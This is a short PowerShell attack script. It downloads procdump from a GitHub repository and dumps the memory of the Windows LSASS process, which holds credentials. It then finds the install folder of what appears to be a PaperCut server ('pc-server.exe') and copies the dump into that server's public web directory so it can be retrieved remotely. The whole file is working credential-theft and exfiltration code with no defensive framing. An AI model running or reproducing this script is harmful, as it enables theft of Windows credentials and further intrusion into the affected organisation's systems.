$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "procdump64.exe"
$dump = Join-Path $env:TEMP "lsass.dmp"

(New-Object Net.WebClient).DownloadFile("$root/procdump64.exe", $tool)
Start-Process -FilePath $tool `
    -ArgumentList @("-accepteula", "-ma", "lsass.exe", $dump) `
    -Wait -PassThru | Out-Null

if (-not (Test-Path $dump)) {
    Write-Output "LSASS_DUMP_MISSING"
    exit 1
}

$server = Get-CimInstance Win32_Process -Filter "Name='pc-server.exe'" |
    Select-Object -First 1
$binWin = Split-Path $server.ExecutablePath -Parent
$bin = Split-Path $binWin -Parent
$home = Split-Path $bin -Parent
$web = Join-Path $home "custom\web"
$name = "lsass_$($env:COMPUTERNAME.Replace('-', '_')).dmp.txt"
Copy-Item $dump (Join-Path $web $name) -Force
Write-Output "LSASS_SIZE=$((Get-Item $dump).Length)"
Write-Output "LSASS_FILE=$name"
